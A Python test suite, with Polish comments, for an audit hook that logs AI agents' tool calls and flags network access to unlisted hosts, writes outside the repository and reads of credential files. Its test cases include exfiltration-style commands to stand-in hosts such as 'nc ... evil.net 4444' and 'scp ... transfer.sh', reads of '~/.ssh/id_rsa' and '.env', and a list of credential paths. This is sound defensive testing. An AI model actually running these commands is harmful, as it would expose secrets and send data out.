"""Testy hooka audytowego wykonawców (`tools/audyt_hook.py`, zadanie 002, docs/rag/13) — bez sieci.

Każda kategoria (sieć, zapis poza repo, poświadczenia) ma przypadki dozwolone i oznaczane.
Bezpieczeństwo hooka: zły JSON → wiersz z flagą i kod 0; nigdy nic na stdout (brak decyzji
blokującej); maskowanie sekretów; nigdy treść plików. Katalog audytu zawsze w `tmp_path`
(zmienna `CLAS5_AUDYT_DIR`), nie w prawdziwym `~`. Ścieżki „wrażliwe” są fikcyjne — hook ich nie
otwiera, tylko ocenia nazwę."""

from __future__ import annotations

import json
import os
import subprocess
import sys
from datetime import datetime, timezone
from pathlib import Path

import pytest
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

from tools import audyt_hook as ah

ROOT = Path(__file__).resolve().parents[1]
SKRYPT = ROOT / "tools" / "audyt_hook.py"
HOSTY = ah.wczytaj_hosty(ROOT / "config" / "audyt_hosty.yaml")
TERAZ = datetime(2026, 9, 29, 12, 0, tzinfo=timezone.utc)


KATALOGI_TMP = ah.katalogi_tmp  # oryginał, zanim fikstura go podmieni
TMP_TESTOWY = (
    "/tmp/clas5-audyt-test-tmp"  # `tmp_path` sam leży w /tmp — w testach „tmp” = ten katalog
)


@pytest.fixture(autouse=True)
def _tmp_testowy(monkeypatch):
    monkeypatch.setattr(ah, "katalogi_tmp", lambda: [TMP_TESTOWY])


@pytest.mark.skipif(os.name == "nt", reason="ścieżki POSIX")
def test_real_tmp_dirs_include_system_tmp():
    assert os.path.realpath("/tmp") in KATALOGI_TMP()


@pytest.fixture()
def repo(tmp_path: Path) -> Path:
    """Minimalne „repo” (katalog z `.git`) jako cwd wywołań."""
    katalog = tmp_path / "repo"
    (katalog / ".git").mkdir(parents=True)
    return katalog


def uruchom(tmp_path: Path, repo: Path, narzedzie: str, wejscie: dict, **pola) -> dict:
    """Jedno wywołanie hooka w procesie → ostatni wiersz dziennika."""
    dane = {"session_id": "s1", "cwd": str(repo), "tool_name": narzedzie, "tool_input": wejscie}
    plik = ah.hook_main(json.dumps({**dane, **pola}), tmp_path / "audyt", HOSTY, TERAZ)
    assert plik is not None
    return json.loads(plik.read_text(encoding="ascii").splitlines()[-1])


def bash(tmp_path: Path, repo: Path, polecenie: str) -> dict:
    return uruchom(tmp_path, repo, "Bash", {"command": polecenie})


# --- lista hostów -------------------------------------------------------------------------------
def test_host_list_matches_yaml_parser_and_holds_repo_sources():
    import yaml

    pelny = yaml.safe_load((ROOT / "config" / "audyt_hosty.yaml").read_text(encoding="utf-8"))
    assert HOSTY == frozenset(str(h).lower() for h in pelny["hosty"])
    for host in (
        "fapi.binance.com",
        "api.bybit.com",
        "api.hyperliquid.xyz",
        "github.com",
        "pypi.org",
    ):
        assert host in HOSTY, host


def test_wildcard_entry_covers_subdomains_only():
    lista = frozenset({"*.example.org"})
    assert ah.host_dozwolony("api.example.org", lista)
    assert not ah.host_dozwolony("example.org", lista)
    assert not ah.host_dozwolony("evilexample.org", lista)


def test_missing_host_file_flags_every_network_call(tmp_path: Path):
    assert ah.wczytaj_hosty(tmp_path / "brak.yaml") == frozenset()


# --- sieć ---------------------------------------------------------------------------------------
@pytest.mark.parametrize(
    "polecenie",
    [
        "curl -s https://fapi.binance.com/fapi/v1/time",
        "wget -qO- https://api.bybit.com/v5/market/time",
        "curl -s api.hyperliquid.xyz/info",
        "pip install -r requirements-lock.txt",
        "python -m pip install hypothesis",
        "python3 -c \"import requests; requests.get('https://api.alternative.me/fng/')\"",
        "git clone https://github.com/anthropics/skills.git /tmp/x",
        "git status && git log -1",
        "python3 -c 'print(1)'",
        "rsync -a runs/ kopia/",
    ],
)
def test_network_to_allowed_hosts_is_not_flagged(tmp_path, repo, polecenie):
    rekord = bash(tmp_path, repo, polecenie)
    assert not {ah.F_SIEC, ah.F_SIEC_NIEZNANY} & set(rekord["flagi"]), rekord


@pytest.mark.parametrize(
    ("polecenie", "host"),
    [
        ("curl -sI https://example.com", "example.com"),
        ("curl -s evil.io/x", "evil.io"),
        ("wget http://1.2.3.4:8080/x", "1.2.3.4"),
        ("pip install --index-url https://pypi.evil.org/simple foo", "pypi.evil.org"),
        ("pip install git+https://gitlab.com/x/y.git", "gitlab.com"),
        ("python3 -c \"import urllib.request as u; u.urlopen('http://paste.ee/r')\"", "paste.ee"),
        ("nc -w 3 evil.net 4444", "evil.net"),
        ("ssh -i klucz user@serwer.obcy.pl 'ls'", "serwer.obcy.pl"),
        ("scp raport.md user@transfer.sh:/x", "transfer.sh"),
        ("git push https://gitlab.com/x/y.git HEAD", "gitlab.com"),
        ("git clone git@bitbucket.org:x/y.git", "bitbucket.org"),
        ("git status\ncurl -s https://evil.io", "evil.io"),
        ("echo $(curl -s https://evil.io)", "evil.io"),
        ("sudo timeout 5 curl https://evil.io", "evil.io"),
        (
            "cat <<EOF | python3 -\nimport socket\nsocket.create_connection(('x', 1))\n"
            "u='https://evil.io'\nEOF",
            "evil.io",
        ),
    ],
)
def test_network_to_unlisted_host_is_flagged(tmp_path, repo, polecenie, host):
    rekord = bash(tmp_path, repo, polecenie)
    assert ah.F_SIEC in rekord["flagi"], rekord
    assert host in rekord["hosty_spoza_listy"]


def test_python_network_without_visible_host_is_flagged_unknown(tmp_path, repo):
    rekord = bash(tmp_path, repo, "python3 -c 'import requests; requests.post(ADRES, data=x)'")
    assert rekord["flagi"] == [ah.F_SIEC_NIEZNANY]


def _git(repo: Path, *args: str) -> None:
    subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True)


@pytest.mark.parametrize(
    ("adres", "oznaczone"),
    [("git@github.com:piotrgebala/alpha.git", False), ("https://evil.io/x.git", True)],
)
def test_git_push_resolves_remote_without_network(tmp_path, adres, oznaczone):
    repo = tmp_path / "g"
    repo.mkdir()
    _git(repo, "init", "-q")
    _git(repo, "remote", "add", "origin", adres)
    rekord = bash(tmp_path, repo, "git push -u origin zadanie-002")
    assert (ah.F_SIEC in rekord["flagi"]) is oznaczone, rekord


def test_webfetch_allowed_and_flagged(tmp_path, repo):
    ok = uruchom(tmp_path, repo, "WebFetch", {"url": "https://github.com/x", "prompt": "p"})
    zle = uruchom(tmp_path, repo, "WebFetch", {"url": "https://pastebin.com/raw/x", "prompt": "p"})
    assert ok["flagi"] == [] and zle["flagi"] == [ah.F_SIEC]
    assert zle["hosty_spoza_listy"] == ["pastebin.com"]


# --- zapisy -------------------------------------------------------------------------------------
@pytest.mark.parametrize("narzedzie", ["Write", "Edit", "MultiEdit"])
def test_write_inside_repo_is_allowed_outside_is_flagged(tmp_path, repo, narzedzie):
    ok = uruchom(tmp_path, repo, narzedzie, {"file_path": str(repo / "tools" / "x.py")})
    wzgledny = uruchom(tmp_path, repo, narzedzie, {"file_path": "runs/x/README.md"})
    zle = uruchom(tmp_path, repo, narzedzie, {"file_path": str(tmp_path / "poza" / "x.txt")})
    ucieczka = uruchom(tmp_path, repo, narzedzie, {"file_path": "../poza.txt"})
    assert ok["flagi"] == [] and wzgledny["flagi"] == []
    assert zle["flagi"] == [ah.F_ZAPIS] and ucieczka["flagi"] == [ah.F_ZAPIS]


def test_notebook_edit_uses_notebook_path(tmp_path, repo):
    rekord = uruchom(tmp_path, repo, "NotebookEdit", {"notebook_path": "/opt/obcy/n.ipynb"})
    assert rekord["flagi"] == [ah.F_ZAPIS] and rekord["sciezka"] == "/opt/obcy/n.ipynb"


def test_worktree_may_write_to_main_runs_and_data_but_not_elsewhere(tmp_path):
    glowny = tmp_path / "alpha"
    worktree = glowny / ".claude" / "worktrees" / "agent-1"
    (glowny / ".git" / "worktrees" / "agent-1").mkdir(parents=True)
    worktree.mkdir(parents=True)
    (worktree / ".git").write_text(
        f"gitdir: {glowny / '.git' / 'worktrees' / 'agent-1'}\n", encoding="utf-8"
    )
    dozwolone = ah.katalogi_dozwolone(str(worktree))
    assert dozwolone == [str(worktree), str(glowny / "runs"), str(glowny / "data")]

    def wynik(p: Path) -> list[str]:
        return uruchom(tmp_path, worktree, "Write", {"file_path": str(p)})["flagi"]

    assert wynik(worktree / "tools" / "a.py") == []
    assert wynik(glowny / "runs" / "skille" / "x.jsonl") == []
    assert wynik(glowny / "data" / "cache" / "x.parquet") == []
    assert wynik(glowny / "tools" / "a.py") == [ah.F_ZAPIS]  # kod głównego checkoutu: poza worktree


@pytest.mark.parametrize(
    ("polecenie", "flaga"),
    [
        ("echo x > runs/log.txt", None),
        ("python skrypt.py > wynik.txt 2>&1", None),
        ("ls > /dev/null", None),
        ("echo x >> /etc/profile", ah.F_ZAPIS),
        ("echo x | tee -a /srv/wspolny/kanal.txt", ah.F_ZAPIS),
        ("cp raport.md /home/ktos/likwidacje/raport.md", ah.F_ZAPIS),
        (f"echo x > {TMP_TESTOWY}/kanal.txt", ah.F_TMP),
    ],
)
def test_bash_redirects_and_copies(tmp_path, repo, polecenie, flaga):
    flagi = bash(tmp_path, repo, polecenie)["flagi"]
    assert flagi == ([flaga] if flaga else []), polecenie


# --- poświadczenia ------------------------------------------------------------------------------
@pytest.mark.parametrize(
    "sciezka",
    [
        "~/.ssh/likwidacje_deploy",
        "/home/x/.ssh/config",
        ".env",
        "config/.env.production",
        "/srv/klucze/binance.pem",
        "/srv/klucze/serwer.key",
        "bybit_api_key.txt",
        "secrets.json",
        "/home/x/.config/gh/hosts.yml",
        "~/.git-credentials",
        "/home/x/.aws/credentials",
        "id_ed25519",
    ],
)
def test_credential_paths_are_flagged_on_read(tmp_path, repo, sciezka):
    rekord = uruchom(tmp_path, repo, "Read", {"file_path": sciezka})
    assert ah.F_POSW in rekord["flagi"], sciezka


@pytest.mark.parametrize(
    "sciezka",
    [
        "README.md",
        "tools/skill_audit.py",
        "tests/test_monkeypatch.py",
        "docs/rag/12_zuzycie_tokenow.md",
        "config/settings.yaml",
        "runs/INDEX.md",
    ],
)
def test_ordinary_paths_are_not_credentials(tmp_path, repo, sciezka):
    assert uruchom(tmp_path, repo, "Read", {"file_path": sciezka})["flagi"] == []


def test_every_tracked_repo_file_is_not_a_credential():
    """Brak fałszywych alarmów na plikach samego repo (lista z gita, bez czytania treści)."""
    wynik = subprocess.run(["git", "-C", str(ROOT), "ls-files"], capture_output=True, text=True)
    if wynik.returncode != 0:
        pytest.skip("brak gita")
    oznaczone = [p for p in wynik.stdout.splitlines() if ah.czy_poswiadczenia("/r/" + p)]
    assert oznaczone == []


def test_bash_read_of_credentials_is_flagged(tmp_path, repo):
    assert ah.F_POSW in bash(tmp_path, repo, "cat ~/.ssh/id_rsa | head -1")["flagi"]
    assert ah.F_POSW in bash(tmp_path, repo, "grep -r TOKEN .env")["flagi"]
    assert bash(tmp_path, repo, "grep -rn api_key tools")["flagi"] == []


def test_grep_and_glob_over_credentials_are_flagged(tmp_path, repo):
    grep = uruchom(tmp_path, repo, "Grep", {"pattern": "BEGIN", "path": "/home/x/.ssh"})
    glob = uruchom(tmp_path, repo, "Glob", {"pattern": "~/.config/gh/*"})
    zwykly = uruchom(tmp_path, repo, "Grep", {"pattern": "api_key", "path": "tools"})
    assert grep["flagi"] == [ah.F_POSW] and glob["flagi"] == [ah.F_POSW]
    assert zwykly["flagi"] == []


def test_touching_the_audit_log_itself_is_flagged(tmp_path, repo):
    rekord = uruchom(tmp_path, repo, "Read", {"file_path": str(tmp_path / "audyt" / "x.jsonl")})
    assert rekord["flagi"] == [ah.F_AUDYT]


# --- bezpieczeństwo i format dziennika ----------------------------------------------------------
def test_record_never_contains_file_content_and_masks_secrets(tmp_path, repo):
    tajne = "ZAWARTOSC-PLIKU-NIE-DO-LOGU"
    rekord = uruchom(tmp_path, repo, "Write", {"file_path": "a.txt", "content": tajne})
    polecenie = (
        'curl -H "Authorization: Bearer abcDEF123456789" "https://x.io/?api_key=s3cr3t&a=1" '
        "https://user:haslo@example.com ghp_abcdefghijklmnopqrstuvwxyz0123 --password=tajne1"
    )
    maskowany = bash(tmp_path, repo, polecenie)
    tekst = (tmp_path / "audyt" / "2026-09-29.jsonl").read_text(encoding="ascii")
    for sekret in (tajne, "abcDEF123456789", "s3cr3t", "haslo", "ghp_abcdef", "tajne1"):
        assert sekret not in tekst, sekret
    assert "content" not in rekord and maskowany["polecenie"].startswith("curl -H")


@pytest.mark.parametrize(
    "polecenie",
    [
        "curl -u jan:hunter2x https://api.github.com",
        "curl --user=jan:hunter2x https://api.github.com",
        "curl -ujan:hunter2x https://api.github.com",
        "curl -U jan:hunter2x -x http://p:8080 https://api.github.com",
    ],
)
def test_basic_auth_user_password_is_masked(tmp_path, repo, polecenie):
    rekord = bash(tmp_path, repo, polecenie)
    assert "hunter2x" not in rekord["polecenie"] and "jan:***" in rekord["polecenie"]


def test_user_flag_without_password_is_kept(tmp_path, repo):
    assert bash(tmp_path, repo, "git push -u origin zadanie-002")["polecenie"].endswith(
        "zadanie-002"
    )


def test_long_command_is_truncated(tmp_path, repo):
    rekord = bash(tmp_path, repo, "echo " + "a " * 1000)
    assert len(rekord["polecenie"]) <= ah.MAKS_ZNAKOW + 1


def test_record_fields(tmp_path, repo):
    rekord = uruchom(
        tmp_path, repo, "Bash", {"command": "ls"}, agent_id="a1", agent_type="wykonawca"
    )
    assert rekord == {
        "czas": "2026-09-29T12:00:00Z",
        "sesja": "s1",
        "agent": "a1",
        "agent_typ": "wykonawca",
        "cwd": str(repo),
        "narzedzie": "Bash",
        "polecenie": "ls",
        "flagi": [],
    }


def test_session_uuid_is_kept_not_masked(tmp_path, repo):
    uuid = "e4729d83-a89b-4699-9fb8-bd965face00d"
    assert uruchom(tmp_path, repo, "Bash", {"command": "ls"}, session_id=uuid)["sesja"] == uuid


@pytest.mark.skipif(os.name == "nt", reason="uprawnienia POSIX")
def test_directory_and_file_permissions(tmp_path, repo):
    bash(tmp_path, repo, "ls")
    assert (tmp_path / "audyt").stat().st_mode & 0o777 == 0o700
    assert (tmp_path / "audyt" / "2026-09-29.jsonl").stat().st_mode & 0o777 == 0o600


@pytest.mark.parametrize("wejscie", [b"", b"{nie json", b"[1, 2]", b"\xff\xfe", b"null"])
def test_bad_input_still_writes_a_flagged_line(tmp_path, wejscie):
    plik = ah.hook_main(wejscie, tmp_path / "audyt", HOSTY, TERAZ)
    assert json.loads(plik.read_text(encoding="ascii"))["flagi"] == [ah.F_WEJSCIE]


def test_analysis_error_is_swallowed_and_logged(tmp_path, repo, monkeypatch):
    def pada(*_a, **_k):
        raise RuntimeError("x")

    monkeypatch.setattr(ah, "analizuj", pada)
    rekord = bash(tmp_path, repo, "ls")
    assert rekord["flagi"] == [ah.F_BLAD] and rekord["blad"] == "RuntimeError"


def test_unwritable_audit_dir_is_silent(tmp_path, repo):
    zajety = tmp_path / "plik"
    zajety.write_text("x", encoding="utf-8")  # katalog audytu wskazuje na plik → mkdir padnie
    assert ah.hook_main('{"tool_name": "Bash"}', zajety / "audyt", HOSTY, TERAZ) is None


@pytest.mark.parametrize(
    "wejscie",
    [
        b"{zly json",
        json.dumps(
            {"tool_name": "Bash", "tool_input": {"command": "curl https://evil.io"}}
        ).encode(),
        json.dumps({"tool_name": "Read", "tool_input": {"file_path": "/x/.ssh/id_rsa"}}).encode(),
    ],
)
def test_script_exits_zero_with_empty_stdout(tmp_path, wejscie):
    """Przez prawdziwy proces: kod 0 i PUSTY stdout — brak jakiejkolwiek decyzji blokującej."""
    env = dict(os.environ, CLAS5_AUDYT_DIR=str(tmp_path / "audyt"))
    wynik = subprocess.run(
        [sys.executable, str(SKRYPT), "hook"],
        input=wejscie,
        capture_output=True,
        env=env,
        timeout=30,
    )
    assert wynik.returncode == 0 and wynik.stdout == b""
    assert len(next((tmp_path / "audyt").glob("*.jsonl")).read_text().splitlines()) == 1


def test_script_without_mode_exits_zero(tmp_path):
    wynik = subprocess.run(
        [sys.executable, str(SKRYPT)], input=b"", capture_output=True, timeout=30
    )
    assert wynik.returncode == 0 and wynik.stdout == b""


# --- właściwości ---------------------------------------------------------------------------------
_tekst = st.text(max_size=200)
_wejscie_narzedzia = st.dictionaries(
    st.sampled_from(["command", "file_path", "notebook_path", "url", "content", "path", "pattern"]),
    st.one_of(_tekst, st.integers(), st.none(), st.lists(_tekst, max_size=3)),
    max_size=4,
)
_zdarzenie = st.fixed_dictionaries(
    {
        "tool_name": st.sampled_from(
            [
                "Bash",
                "Read",
                "Write",
                "Edit",
                "MultiEdit",
                "NotebookEdit",
                "WebFetch",
                "Grep",
                "Glob",
                "Inne",
                7,
            ]
        ),
        "tool_input": st.one_of(_wejscie_narzedzia, _tekst, st.none()),
    },
    optional={"cwd": st.one_of(_tekst, st.none()), "session_id": _tekst, "agent_id": _tekst},
)


@settings(
    max_examples=150, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture]
)
@given(surowe=st.one_of(st.binary(max_size=300), _zdarzenie.map(json.dumps)))
def test_property_any_input_gives_exactly_one_valid_json_line(tmp_path, surowe):
    katalog = tmp_path / "wl"
    plik = katalog / "2026-09-29.jsonl"
    przed = len(plik.read_bytes().splitlines()) if plik.exists() else 0
    wynik = ah.hook_main(surowe, katalog, HOSTY, TERAZ)
    assert wynik == plik
    linie = plik.read_bytes().splitlines()
    assert len(linie) == przed + 1
    rekord = json.loads(linie[-1].decode("ascii"))
    assert isinstance(rekord["flagi"], list) and rekord["czas"] == "2026-09-29T12:00:00Z"


@settings(max_examples=200, deadline=None)
@given(polecenie=st.text(max_size=300))
def test_property_tokenizer_never_raises(polecenie):
    for slowa in ah.segmenty(polecenie):
        assert slowa and all(isinstance(s, str) for s in slowa)
    assert len(ah.maskuj(polecenie)) <= ah.MAKS_ZNAKOW + 1
